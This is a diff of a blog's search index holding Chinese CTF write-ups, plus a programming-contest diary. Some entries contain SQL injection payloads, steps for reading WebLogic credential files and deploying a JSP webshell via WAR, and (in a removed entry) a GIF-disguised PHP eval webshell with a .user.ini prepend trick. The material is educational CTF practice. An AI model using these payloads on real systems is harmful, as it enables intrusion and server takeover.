class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>
-
-<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
-<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
-<p>先通过任意文件读取漏洞获得密钥和密文</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>
-
-<p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
-<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
-<p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
-<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
-<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
-]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-      </tags>
   </entry>
   <entry>
     <title>反弹shell测试</title>
@@ -1835,31 +1843,38 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
         <category>ctf学习</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
         <tag>测试工具</tag>
       </tags>
   </entry>
   <entry>
-    <title>20211017</title>
-    <url>/posts/cd46c142/</url>
-    <content><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>buu这个题应该是环境有问题，不能复现wp</p>
-<p>先上传user.ini</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_propend_file=<span class="number">1.</span>gif</span><br></pre></td></tr></table></figure>
-<p>然后上传图片马</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>访问路径下的index.php，让它自动加载马</p>
-<p>蚁剑或者直接cat flag</p>
-<p>一会儿在本地测试一下</p>
-<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>md5的一些基操</p>
+    <title>国庆赛部分赛题复现</title>
+    <url>/posts/bfdb9200/</url>
+    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
+<p>环境有点问题，复现一半出不来了</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>
+
+<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
+<p>先通过任意文件读取漏洞获得密钥和密文</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>
+
+<p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
+<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
+<p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
+<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
+<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
 ]]></content>
       <categories>
-        <category>ctf每日一题</category>
+        <category>ctf学习</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
-        <tag>文件上传</tag>
+        <tag>ctf</tag>
+        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2003,6 +2018,26 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
+    <title>蓝桥杯感想</title>
+    <url>/posts/c4930d9e/</url>
+    <content><![CDATA[<blockquote>
+<p>人在宿舍，刚下考场</p>
+</blockquote>
+<h2 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h2><p>今年第一次参加，以后也不会参加了，还是专心打ctf好。<br>差不多一小时做题，三小时挂机。感觉全是搜索，的确是暴力杯，无奈一星期速成的算法功底，的确太拉了。考试前笔还被我摔坏了，全程脑子想。而且数据结构的题偏多，但我还没学，无奈用离散数学的知识做了做（打表）。</p>
+<h2 id="题目情况"><a href="#题目情况" class="headerlink" title="题目情况"></a>题目情况</h2><p>总体来说也就那样，感觉比去年难。</p>
+<p>前两道填空简简单单，第一个直接打表。</p>
+<p>第二个用set去重一直报bug，最后也不知道哪错了。</p>
+<p>第三个2个for循环，暴力就行，跑了大概1分钟出结果了。</p>
+<p>第四个找路径，搜了搜，没出结果。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>蓝桥杯</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>线性规划与整数线性规划</title>
     <url>/posts/dea132b6/</url>
     <content><![CDATA[<h1 id="线性规划"><a href="#线性规划" class="headerlink" title="线性规划"></a>线性规划</h1><blockquote>
@@ -2041,26 +2076,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       <tags>
         <tag>matlab</tag>
         <tag>数学建模</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>蓝桥杯感想</title>
-    <url>/posts/c4930d9e/</url>
-    <content><![CDATA[<blockquote>
-<p>人在宿舍，刚下考场</p>
-</blockquote>
-<h2 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h2><p>今年第一次参加，以后也不会参加了，还是专心打ctf好。<br>差不多一小时做题，三小时挂机。感觉全是搜索，的确是暴力杯，无奈一星期速成的算法功底，的确太拉了。考试前笔还被我摔坏了，全程脑子想。而且数据结构的题偏多，但我还没学，无奈用离散数学的知识做了做（打表）。</p>
-<h2 id="题目情况"><a href="#题目情况" class="headerlink" title="题目情况"></a>题目情况</h2><p>总体来说也就那样，感觉比去年难。</p>
-<p>前两道填空简简单单，第一个直接打表。</p>
-<p>第二个用set去重一直报bug，最后也不知道哪错了。</p>
-<p>第三个2个for循环，暴力就行，跑了大概1分钟出结果了。</p>
-<p>第四个找路径，搜了搜，没出结果。</p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-      <tags>
-        <tag>蓝桥杯</tag>
       </tags>
   </entry>
   <entry>
@@ -2715,8 +2730,8 @@ const USER_AGENT = &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko
         <category>ctf学习</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
 </search>
